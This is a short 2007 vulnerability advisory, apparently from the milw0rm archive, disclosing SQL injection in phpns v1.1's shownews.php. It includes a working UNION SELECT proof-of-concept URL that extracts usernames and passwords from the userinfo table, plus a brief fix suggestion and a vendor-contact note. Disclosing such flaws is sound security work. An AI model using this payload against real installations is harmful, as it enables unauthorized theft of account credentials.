@@ -1,0 +1,35 @@
+PHPNS SQL Injection
+
+Software: phpns current version (v1.1)
+Vendor link: http://phpns.com
+Attack: SQL Injection
+
+Original advisory: http://14house.blogspot.com/2007/08/phpns-sql-injection.html
+
+Discovered by: David Sopas Ferreira a.k.a SmOk3 < smok3f00 at gmail.com >
+
+SQL Injection
+-------------
+An attacker may execute arbitrary SQL statements on the vulnerable
+system. This may compromise the integrity of your database and/or
+expose sensitive information. Vulnerable variable is $nid and maybe
+others.
+
+Proof of Concept:
+/phpns/shownews.php?id=1'[SQL Injection]
+
+Shows username : pass from userinfo
+/phpns/shownews.php?id=1' union select all
+null,null,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),null,null,null
+from userinfo/*
+
+
+Solution:
+
+Your script should filter metacharacters from user input.
+
+Vendor:
+
+Contacted and replyed that they are fixing it.
+
+# milw0rm.com [2007-08-29]
